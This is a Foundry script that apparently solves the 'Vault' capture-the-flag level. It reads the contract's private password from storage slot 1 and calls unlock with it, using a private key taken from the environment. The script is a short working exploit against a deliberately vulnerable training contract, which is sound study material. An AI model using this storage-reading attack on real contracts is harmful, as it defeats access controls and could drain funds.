// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { Vault } from "../src/08_Vault.sol";

contract VaultAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address challengeInstanceAddress = helperConfig.instances("Vault");
    Vault challenge = Vault(challengeInstanceAddress);

    vm.startBroadcast(deployerPrivateKey);
    bytes32 slotData = vm.load(challengeInstanceAddress, bytes32(uint256(1)));
    challenge.unlock(slotData);
    console.log("Locked: %s", challenge.locked());

    vm.stopBroadcast();
  }

}